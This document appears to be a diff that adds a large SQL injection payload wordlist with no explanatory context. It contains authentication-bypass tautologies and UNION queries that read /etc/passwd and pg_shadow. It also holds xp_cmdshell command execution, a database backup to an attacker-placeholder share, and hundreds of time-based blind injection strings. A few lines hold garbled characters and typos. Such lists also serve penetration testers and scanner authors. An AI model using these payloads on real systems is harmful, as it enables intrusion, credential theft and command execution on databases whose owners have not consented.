+or 0=0 --
+or 0=0 #
+ or 4479=4479 #"
+' or 4479=4479 --
+' or 4479=4479 #
+" or 4479=4479 --
+or 4479=4479 --
+or 4479=4479 #
+ or 'W'='W' #"
+' or 'W'='W' --
+' or 'W'='W' #
+" or 'W'='W' --
+or 'W'='W' --
+or 'W'='W' #
+' or 1 --'
+' or 1/*
+; or '1'='1'
+' or '1'='1
+' or '1'='1'--
+' or 1=1
+' or 1=1 /*
+' or 1=1--
+' or 1=1-- 
+'/**/or/**/1/**/=/**/1
+' or 1=1 --
+" or 1=1--
+or 1=1
+or 1=1--
+ or 1=1 or ""=
+' or 1=1 or ''='
+' or 1 in (select @@version)--
+' or 4479 --'
+' or 4479/*
+; or '4479'='4479'
+' or '4479'='4479
+' or '4479'='4479'--
+' or 4479=4479
+' or 4479=4479 /*
+' or 4479=4479--
+' or 4479=4479-- 
+'/**/or/**/4479/**/=/**/4479
+' or 4479=4479 --
+" or 4479=4479--
+or 4479=4479
+or 4479=4479--
+ or 4479=4479 or ""=
+' or 4479=4479 or ''='
+' or 4479 in (select @@version)--
+' or ''qwer'' --'
+' or ''qwer''/*
+; or '''qwer'''='''qwer'''
+' or '''qwer'''='''qwer''
+' or '''qwer'''='''qwer'''--
+' or ''qwer''=''qwer''
+' or ''qwer''=''qwer'' /*
+' or ''qwer''=''qwer''--
+' or ''qwer''=''qwer''-- 
+'/**/or/**/''qwer''/**/=/**/''qwer''
+' or ''qwer''=''qwer'' --
+" or ''qwer''=''qwer''--
+or ''qwer''=''qwer''
+or ''qwer''=''qwer''--
+ or ''qwer''=''qwer'' or ""=
+' or ''qwer''=''qwer'' or ''='
+' or ''qwer'' in (select @@version)--
+or%201=1
+or%201=1 --
+' or 2 > 1
+' or 3 > 1
+' or 4 > 1
+' or 10 > 9
+' or 5 > 6
+' or 4 > 7
+' or 119 > 30000001
+' or 2 between 1 and 3
+' or 2 between 1 and 5
+' or 2 between 2 and 5
+' or 3=3
+' or 3=3 --
+' or '7659'='7659
+ or a=a
+ or a = a
+' or 'a'='a
+' or a=a--
+') or ('a'='a
+" or "a"="a
+) or (a=a
+order by
+' or (EXISTS)
+ or isNULL(1/0) /*
+" or isNULL(1/0) /*
+' or 'something' like 'some%'
+' or 'something' = 'some'+'thing'
+' or 'text' = n'text'
+' or 'text' > 't'
+' or uid like '%
+' or uname like '%
+' or 'unusual' = 'unusual'
+' or userid like '%
+' or user like '%
+' or username like '%
+' or username like char(37);
+' or 'whatever' in ('whatever')
+' -- &password=
+password:*/=1--
+PRINT
+PRINT @@variable
+procedure
+replace
+select
+' select * from information_schema.tables--
+' select name from syscolumns where id = (select id from sysobjects where name = tablename')--
+' (select top 1
+--sp_password
+'sqlattempt1
+(sqlattempt2)
+'sqlvuln
+'+sqlvuln
+(sqlvuln)
+sqlvuln;
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+to_timestamp_tz
+truncate
+tz_offset
+' UNION ALL SELECT
+' union all select @@version--
+' union select 
+uni/**/on sel/**/ect
+' UNION SELECT
+' union select 1,load_file('/etc/passwd'),1,1,1;
+) union select * from information_schema.tables;
+' union select * from users where login = char(114,111,111,116);
+update
+'||UTL_HTTP.REQUEST
+,@variable
+@variable
+@var select @var as var into temp end --
+\x27UNION SELECT
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+x' or 1=1 or 'x'='y
+x' OR full_name LIKE '%Bob%
+y or 1=1 --
+y' AND 1=(SELECT COUNT(*) FROM tabname); --
+y' AND email IS NULL; --
+y' AND members.email IS NULL; --
+y' AND userid IS NULL; --
+y' or 1=1 or 'y'='y
+y' OR full_name LIKE '%Bob%
+y ' or 2 > 1
+y ' or 3 > 1
+y ' or 4 > 1
+y ' or 10 > 9
+y ' or 5 > 6
+y ' or 4 > 7
+y ' or 119 > 30000001
+y ' or 2 between 1 and 3
+y ' or 2 between 1 and 5
+y ' or 2 between 2 and 5
+y ' or 3=3
+y ' or 3=3 --
+select versionnumber, version_timestamp from sysibm.sysversions;
+select user from sysibm.sysdummy1;
+select session_user from sysibm.sysdummy1;
+select system_user from sysibm.sysdummy1;
+select current server from sysibm.sysdummy1;
+select name from sysibm.systables;
+select grantee from syscat.dbauth;
+select * from syscat.tabauth;
+select * from syscat.dbauth where grantee = current user;
+select * from syscat.tabauth where grantee = current user;
+select name, tbname, coltype from sysibm.syscolumns;
+SELECT schemaname FROM syscat.schemata;
+select @@version
+select @@servernamee
+select @@microsoftversione
+select * from master..sysserverse
+select * from sysusers
+exec master..xp_cmdshell 'ipconfig+/all'	
+exec master..xp_cmdshell 'net+view'
+exec master..xp_cmdshell 'net+users'
+exec master..xp_cmdshell 'ping+<attackerip>'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp?" select * from myfile"--
+<username>' OR 1=1--
+'OR '' = '	Allows authentication without a valid username.
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+select version();	
+select current_database();
+select current_user;
+select session_user;
+select current_setting('log_connections');
+select current_setting('log_statement');
+select current_setting('port');
+select current_setting('password_encryption');
+select current_setting('krb_server_keyfile');
+select current_setting('virtual_host');
+select current_setting('port');
+select current_setting('config_file');
+select current_setting('hba_file');
+select current_setting('data_directory');
+select * from pg_shadow;
+select * from pg_group;
+create table myfile (input TEXT);
+copy myfile from '/etc/passwd'; 
+select * from myfile;copy myfile to /tmp/test;
+'1'OR'1∩
+1∩ OR '1'='1
+1'or'1
+1%20and%20 1=1
+' union select all 1,2,x,x,x,x 〞
+' union select 1,2,3,x,x,x,x,@@version,x每
+' union+select+banner,null,null,null,null+from+v$version每
+' union+select+user,null,null,null,null+from+dual每
+' union+select+global_name,null,null,null,null+from+global_name每
+' union+select+owner,null,null,null,null+from+all_tables每
+' union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual每
+%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual每
+2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual)
+2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)
+' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
+)%20waitfor%20delay%20'0:0:20'%20/*
+)%20waitfor%20delay%20'0:0:20'%20--
+')%20waitfor%20delay%20'0:0:20'%20/*
+')%20waitfor%20delay%20'0:0:20'%20--
+")%20waitfor%20delay%20'0:0:20'%20/*
+")%20waitfor%20delay%20'0:0:20'%20--
+))%20waitfor%20delay%20'0:0:20'%20/*
+))%20waitfor%20delay%20'0:0:20'%20--
+'))%20waitfor%20delay%20'0:0:20'%20/*
+'))%20waitfor%20delay%20'0:0:20'%20--
+"))%20waitfor%20delay%20'0:0:20'%20/*
+"))%20waitfor%20delay%20'0:0:20'%20--
+,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL)%20waifor%20delay%20'0:0:20'%20/*
+',NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL)%20waifor%20delay%20'0:0:20'%20/*
+'),NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+ waitfor delay '0:0:20' /* 
+ waitfor delay '0:0:20' --
+' waitfor delay '0:0:20' /* 
+' waitfor delay '0:0:20' --
+" waitfor delay '0:0:20' /* 
+" waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /* 
+) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /* 
+)) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /* 
+))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /* 
+)))) waitfor delay '0:0:20' --
+))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:20' --
+') waitfor delay '0:0:20' /* 
+') waitfor delay '0:0:20' --
+") waitfor delay '0:0:20' /* 
+") waitfor delay '0:0:20' --
+')) waitfor delay '0:0:20' /* 
+')) waitfor delay '0:0:20' --
+")) waitfor delay '0:0:20' /* 
+")) waitfor delay '0:0:20' --
+'))) waitfor delay '0:0:20' /* 
+'))) waitfor delay '0:0:20' --
+"))) waitfor delay '0:0:20' /* 
+"))) waitfor delay '0:0:20' --
+')))) waitfor delay '0:0:20' /* 
+')))) waitfor delay '0:0:20' --
+")))) waitfor delay '0:0:20' /* 
+")))) waitfor delay '0:0:20' --
+'))))) waitfor delay '0:0:20' /* 
+'))))) waitfor delay '0:0:20' --
+"))))) waitfor delay '0:0:20' /* 
+"))))) waitfor delay '0:0:20' --
+')))))) waitfor delay '0:0:20' /* 
+')))))) waitfor delay '0:0:20' --
+")))))) waitfor delay '0:0:20' /* 
+")))))) waitfor delay '0:0:20' --
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+ and 0=benchmark(3000000,MD5(1))%20/*
+ and 0=benchmark(3000000,MD5(1))%20--
+ and 0=benchmark(3000000,MD5(1))%20%23
+' and 0=benchmark(3000000,MD5(1))%20/*
+' and 0=benchmark(3000000,MD5(1))%20--
+' and 0=benchmark(3000000,MD5(1))%20%23
+" and 0=benchmark(3000000,MD5(1))%20/*
+" and 0=benchmark(3000000,MD5(1))%20--
+" and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20/*
+) and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20%23
+)) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--
+)) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--
+)))) and 0=benchmark(3000000,MD5(1))%20%23
+') and 0=benchmark(3000000,MD5(1))%20/*
+') and 0=benchmark(3000000,MD5(1))%20--
+') and 0=benchmark(3000000,MD5(1))%20%23
+") and 0=benchmark(3000000,MD5(1))%20/*
+") and 0=benchmark(3000000,MD5(1))%20--
+") and 0=benchmark(3000000,MD5(1))%20%23
+')) and 0=benchmark(3000000,MD5(1))%20/*
+')) and 0=benchmark(3000000,MD5(1))%20--
+')) and 0=benchmark(3000000,MD5(1))%20%23
+")) and 0=benchmark(3000000,MD5(1))%20/*
+")) and 0=benchmark(3000000,MD5(1))%20--
+")) and 0=benchmark(3000000,MD5(1))%20%23
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+'))) and 0=benchmark(3000000,MD5(1))%20--
+'))) and 0=benchmark(3000000,MD5(1))%20%23
